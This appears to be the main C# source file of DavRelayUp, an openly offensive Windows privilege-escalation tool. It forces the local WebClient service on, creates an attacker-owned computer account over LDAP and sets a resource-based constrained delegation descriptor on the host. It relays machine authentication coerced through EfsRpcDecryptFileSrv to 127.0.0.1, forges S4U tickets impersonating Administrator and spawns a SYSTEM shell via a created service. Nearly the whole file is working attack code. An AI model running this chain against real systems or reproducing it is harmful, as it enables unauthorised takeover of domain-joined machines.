using DavRelayUp.AuthTrigger;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace DavRelayUp
{

    public static class Options
    {

        public enum PhaseType
        {
            System = 0,
            Relay = 1,
            KrbSCM = 2,
        }

        public static PhaseType phase = PhaseType.System;

        // General Options
        public static string domain = null;
        public static string domainDN = "";
        public static string domainController = null;
        public static bool useSSL = false;
        public static int ldapPort = 389;
        public static bool useCreateNetOnly = false;
        public static bool verbose = false;
        public static bool triggerDone = false;

        // Relay Options
        public static int webdavServerPort = 55555;
        public static bool attackDone = false;

        // RBCD Method
        public static bool rbcdCreateNewComputerAccount = false;
        public static string rbcdComputerName = "DAVRELAYUP";
        public static string rbcdComputerPassword = null;
        public static string rbcdComputerPasswordHash = null;
        public static string rbcdComputerSid = null;
        public static string targetComputerDN = null;

        // Spawn Options
        public static string impersonateUser = "Administrator";
        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
        public static string targetDN = "";

        // KRBSCM Options
        public static string serviceName = "KrbSCM";
        public static string serviceCommand = null;

        public static void PrintOptions()
        {
            var allPublicFields = typeof(Options).GetFields();
            foreach (var opt in allPublicFields)
            {
                Console.WriteLine($"{opt.Name}:{opt.GetValue(null)}");
            }
        }

        public static void GetHelp()
        {
            Console.WriteLine("Usage: DavRelayUp.exe [-c] [-cn COMPUTERNAME] [-cp PASSWORD | -ch NTHASH]");
            Console.WriteLine("");
            Console.WriteLine("RBCD Options:");
            Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=DAVRELAYUP$)");
            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
            Console.WriteLine("    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)");
            Console.WriteLine("    -i   (--Impersonate)              User to impersonate. Should be a local administrator in the target computer. (default=Administrator)");
            Console.WriteLine("");
            Console.WriteLine("KrbSCM Options:");
            Console.WriteLine("    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
            Console.WriteLine("");
            Console.WriteLine("General Options:");
            Console.WriteLine("    -p  (--Port)                     Port for WebDAV Server (default=55555)");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain. (Optional)");
            Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
            Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
            Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (Optional)");
            Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
            Console.WriteLine("    -h  (--Help)                     Show help");
            Console.WriteLine("");
        }

        public static bool ParseArgs(string[] args)
        {

            if (args.Length == 0 || Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(h|Help)$").Match(s).Success) != -1)
            {
                GetHelp();
                return false;
            }

            if (!Enum.TryParse<Options.PhaseType>(args[0], true, out Options.phase))
            {
                Options.phase = PhaseType.Relay;
            }

            // General Options
            int iWebdavServerPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
            int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
            int iCreateNetOnly = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(n|CreateNetOnly)$").Match(s).Success);
            int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
            if (iWebdavServerPort != -1)
            {
                try
                {
                    Options.webdavServerPort = int.Parse(args[iWebdavServerPort + 1]);
                } 
                catch (System.FormatException)
                {
                    Console.WriteLine("[!] Could not parse [-p] flag (it should be a number...)");
                    return false;
                }
            }
            Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
            Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
            Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
            if (Options.useSSL)
                Options.ldapPort = 636;
            Options.useCreateNetOnly = (iCreateNetOnly != -1) ? true : Options.useCreateNetOnly;
            Options.verbose = (iVerbose != -1) ? true : Options.verbose;


            // RBCD Method
            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
            int iImpersonateUser = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
            Options.rbcdCreateNewComputerAccount = (iCreateNewComputerAccount != -1) ? true : Options.rbcdCreateNewComputerAccount;
            Options.rbcdComputerName = (iComputerName != -1) ? args[iComputerName + 1].TrimEnd('$') : Options.rbcdComputerName;
            Options.rbcdComputerPassword = (iComputerPassword != -1) ? args[iComputerPassword + 1] : Options.rbcdComputerPassword;
            Options.rbcdComputerPasswordHash = (iComputerPasswordHash != -1) ? args[iComputerPasswordHash + 1] : Options.rbcdComputerPasswordHash;
            Options.impersonateUser = (iImpersonateUser != -1) ? args[iImpersonateUser + 1] : Options.impersonateUser;

            // KRBSCM Options
            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
            Options.serviceName = (iServiceName != -1) ? args[iServiceName + 1] : Options.serviceName;
            Options.serviceCommand = (iServiceCommand != -1) ? args[iServiceCommand + 1] : Options.serviceCommand;

            if (Options.phase == PhaseType.Relay && Options.rbcdCreateNewComputerAccount == false && String.IsNullOrEmpty(Options.rbcdComputerPassword) && String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
            {
                Console.WriteLine("[!] Please specify [-c] to create a new computer account or supply credentials to an existing one using [-cn] and [-cp|-ch] flags.");
                return false;
            }

            return true;

        }

    }

    public class Program
    {

        [DllImport("GoRelayServer", EntryPoint = "RunRelayServer")]
        extern static void RunRelayServer(int Port, string LdapURL, string TargetDN, string Base64RBCDSecurityDescriptor);
        
        public static void Main(string[] args)
        {
            Console.WriteLine("DavRelayUp - Relaying you to SYSTEM, again...\n");

            // Parse arguments
            if (!Options.ParseArgs(args))
                return;

            if (Options.phase == Options.PhaseType.System)
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                return;
            }
            else if (Options.phase == Options.PhaseType.KrbSCM)
            {
                KrbSCM.Run();
                return;
            }

            // Attempt to enable WebClient service
            if (!WebClientEnabler.StartWebClientService())
            {
                Console.WriteLine("[-] Failed to start WebClient Service");
                return;
            }
            Console.WriteLine("[+] WebClient Service started successfully");

            // If domain or dc is null try to find the them automatically
            if (String.IsNullOrEmpty(Options.domain) || String.IsNullOrEmpty(Options.domainController))
            {
                if (!Networking.GetDomainInfo())
                    return;
            }

            // Check if domain controller is an IP and if so try to resolve it to the DC FQDN
            if (!String.IsNullOrEmpty(Options.domainController))
            {
                Options.domainController = Networking.GetDCNameFromIP(Options.domainController);
                if (String.IsNullOrEmpty(Options.domainController))
                {
                    Console.WriteLine("[-] Could not find Domain Controller FQDN From IP. Try specifying the FQDN with --DomainController flag.");
                    return;
                }
            }

            Options.domainDN = Networking.GetDomainDN(Options.domain);
            // Bind to LDAP using current authenticated user
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Options.domainController, Options.ldapPort);
            LdapConnection ldapConnection = new LdapConnection(identifier);

            string ldapString = $"{Options.domainController}:{Options.ldapPort}";
            // spoppi make SSL work 
            if (Options.useSSL)
            {
                ldapString = "ldaps://" + ldapString;
                ldapConnection.SessionOptions.ProtocolVersion = 3;
                ldapConnection.SessionOptions.SecureSocketLayer = true;
            }
            else // test showed that these options are mutually exclusive
            {
                ldapString = "ldap://" + ldapString;
                ldapConnection.SessionOptions.Sealing = true;
                ldapConnection.SessionOptions.Signing = true;
            }

            ldapConnection.Bind();

            if (Options.rbcdCreateNewComputerAccount)
            {
                // Generate random passowrd for the new computer account if not specified
                if (String.IsNullOrEmpty(Options.rbcdComputerPassword))
                    Options.rbcdComputerPassword = RandomPasswordGenerator(16);

                AddRequest request = new AddRequest();
                request.DistinguishedName = $"CN={Options.rbcdComputerName},CN=Computers,{Options.domainDN}";
                request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{Options.rbcdComputerName}$"));
                request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{Options.rbcdComputerName}.{Options.domain}"));
                request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{Options.rbcdComputerName}.{Options.domain}", $"RestrictedKrbHost/{Options.rbcdComputerName}.{Options.domain}", $"HOST/{Options.rbcdComputerName}", $"RestrictedKrbHost/{Options.rbcdComputerName}"));
                request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{Options.rbcdComputerPassword}\"")));

                try
                {
                    DirectoryResponse res = ldapConnection.SendRequest(request);
                    Console.WriteLine($"[+] Computer account \"{Options.rbcdComputerName}$\" added with password \"{Options.rbcdComputerPassword}\"");
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Could not add new computer account:");
                    Console.WriteLine($"[-] {e.Message}");
                    return;
                }
            }

            // Get computer SID for RBCD
            Options.rbcdComputerSid = LdapSearchComputerName(ldapConnection, Options.rbcdComputerName, Options.domainDN).ObjectSID;
            if (String.IsNullOrEmpty(Options.rbcdComputerSid))
                return;

            // Get current computer DN
            Options.targetComputerDN = LdapSearchComputerName(ldapConnection, Environment.MachineName, Options.domainDN).ObjectDN;
            if (String.IsNullOrEmpty(Options.targetComputerDN))
                return;

            // Replace any space characters with "\20" to fix the LDAP error:
            // LDAP Result Code 1 "Operations Error": 000020D6: SvcErr: DSID-031007E5, problem 5012 (DIR_ERROR), data 0
            Options.targetComputerDN = Options.targetComputerDN.Replace(" ", "\\20");

            // Prepare msDS-AllowedToActOnBehalfOfOtherIdentity attribute
            var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + Options.rbcdComputerSid + ")";
            RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
            byte[] value = new byte[sd.BinaryLength];
            sd.GetBinaryForm(value, 0);
            string b64_sd = Convert.ToBase64String(value);

            

            // Start relay server as a background task
            Task RelayServerTask = Task.Run(() =>  RunRelayServer(Options.webdavServerPort, ldapString, Options.targetComputerDN, b64_sd));
            System.Threading.Thread.Sleep(1500);
            
            // Hook AcquireCredentialsHandle and InitializeSecurityContext before triggering system auth using RPC
            KrbSCM.HookSecurityContext();

            // Trigger authentication from local machine account
            EfsTrigger.Trigger("127.0.0.1", Environment.MachineName, Options.webdavServerPort, EfsTrigger.ApiCall.EfsRpcDecryptFileSrv);
            Options.triggerDone = true;
            RelayServerTask.Wait();

            byte[] bFinalTicket = null;
            Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
            string hash = null;

            if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
            {
                string salt = $"{Options.domain.ToUpper()}host{Options.rbcdComputerName.ToLower()}.{Options.domain.ToLower()}";
                hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, Options.rbcdComputerPassword, salt);
                eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
            {
                hash = Options.rbcdComputerPasswordHash;
                eType = Interop.KERB_ETYPE.rc4_hmac;
            }

            byte[] bInnerTGT = AskTGT.TGT($"{Options.rbcdComputerName}$", Options.domain, hash, eType, outfile: null, ptt: false);
            KRB_CRED TGT = new KRB_CRED(bInnerTGT);
            if (Options.verbose)
                Console.WriteLine($"[+] VERBOSE: Base64 TGT for {Options.rbcdComputerName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

            KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
            if (Options.verbose)
                Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");

            bFinalTicket = S4U.S4U2Proxy(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: !Options.useCreateNetOnly, tgs: elevateTicket);
            if (Options.verbose)
                Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");

            System.Threading.Thread.Sleep(2500);

            if (Options.useCreateNetOnly)
            {
                string finalCommand = $"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName} krbscm";
                if (!String.IsNullOrEmpty(Options.serviceName))
                    finalCommand = $"{finalCommand} --ServiceName \"{Options.serviceName}\"";
                if (!String.IsNullOrEmpty(Options.serviceCommand))
                    finalCommand = $"{finalCommand} --ServiceCommand \"{Options.serviceCommand}\"";
                Helpers.CreateProcessNetOnly(finalCommand, show: false, kirbiBytes: bFinalTicket);
            }
            else
            {
                KrbSCM.Run();
            }

        }

        struct LdapSearchComputerNameResponse
        {
            public string ObjectSID { get; set; }
            public string ObjectDN { get; set; }
        }

        static LdapSearchComputerNameResponse LdapSearchComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
        {
            LdapSearchComputerNameResponse res = new LdapSearchComputerNameResponse();
            string searchFilter = $"(sAMAccountName={computerName}$)";
            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, System.DirectoryServices.Protocols.SearchScope.Subtree, "DistinguishedName", "objectSid");
            try
            {
                SearchResponse response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                res.ObjectDN = (string)response.Entries[0].Attributes["DistinguishedName"][0];
                res.ObjectSID = (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not find computer account");
                Console.WriteLine($"[-] {e.Message}");
            }
            return res;
        }

        static string RandomPasswordGenerator(int length)
        {
            string alphaCaps = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string alphaLow = "abcdefghijklmnopqrstuvwxyz";
            string numerics = "1234567890";
            string special = "@#$-=/";
            string[] allChars = { alphaLow, alphaCaps, numerics, special };
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            int t = 0;
            while (0 < length--)
            {
                res.Append(allChars[t][rnd.Next(allChars[t].Length)]);
                if (t == 3)
                    t = 0;
                else
                    t++;
            }
            return res.ToString();
        }

    }
}
